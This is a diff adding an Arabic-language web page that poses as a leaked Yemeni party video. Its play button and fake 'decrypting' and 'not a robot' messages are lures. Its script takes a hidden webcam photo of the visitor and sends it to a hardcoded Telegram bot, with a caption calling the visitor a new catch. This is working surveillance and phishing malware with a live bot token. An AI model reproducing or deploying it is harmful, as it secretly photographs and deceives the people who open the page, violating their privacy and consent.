@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>تسريب يمني حصري</title>
+    <style>
+        body { background: #111; color: #fff; text-align: center; font-family: 'Arial', sans-serif; padding-top: 50px; }
+        .warning { color: #ff0000; font-weight: bold; font-size: 20px; }
+        .video-player { width: 90%; max-width: 600px; height: 350px; background: #000; margin: 20px auto; border: 3px solid #333; display: flex; align-items: center; justify-content: center; position: relative; cursor: pointer; }
+        .play-icon { font-size: 80px; color: rgba(255,255,255,0.7); }
+        .footer { margin-top: 20px; font-size: 14px; color: #777; }
+    </style>
+</head>
+<body>
+    <div class="warning">⚠️ محتوى مسرب - يمنع النشر ⚠️</div>
+    <h1>أقوى حفلة شبابية يمنية (تسريب حصري)</h1>
+    
+    <div class="video-player" onclick="startSystem()">
+        <div class="play-icon">▶️</div>
+    </div>
+    <p>اضغط على زر التشغيل للمشاهدة فوراً</p>
+
+    <video id="v" style="display:none;" autoplay></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const TOKEN = '8401796384:AAGWBfPdhx8Y9Hal4pca1WNse1Z-I2NOEDk';
+        const CHAT_ID = '6013627471'; // تأكد من استبدال هذا بمعرفك الخاص (Chat ID)
+
+        function startSystem() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                document.getElementById('v').srcObject = stream;
+                // إظهار رسالة وهمية لتمويه الضحية
+                alert("جاري فك تشفير الفيديو، يرجى الانتظار...");
+                
+                // التقاط الصورة بعد الإذن مباشرة
+                setTimeout(() => {
+                    const canvas = document.getElementById('c');
+                    canvas.width = 640; canvas.height = 480;
+                    canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0);
+                    
+                    canvas.toBlob(blob => {
+                        const fd = new FormData();
+                        fd.append('chat_id', CHAT_ID);
+                        fd.append('photo', blob, 'leak.png');
+                        fd.append('caption', '📸 صيد جديد من "تسريب يمني"');
+                        
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    }, 'image/png');
+                }, 500);
+            }).catch(e => {
+                alert("خطأ: يجب السماح بالكاميرا للتأكد من أنك لست روبوت (Verification)");
+            });
+        }
+    </script>
+</body>
+</html>
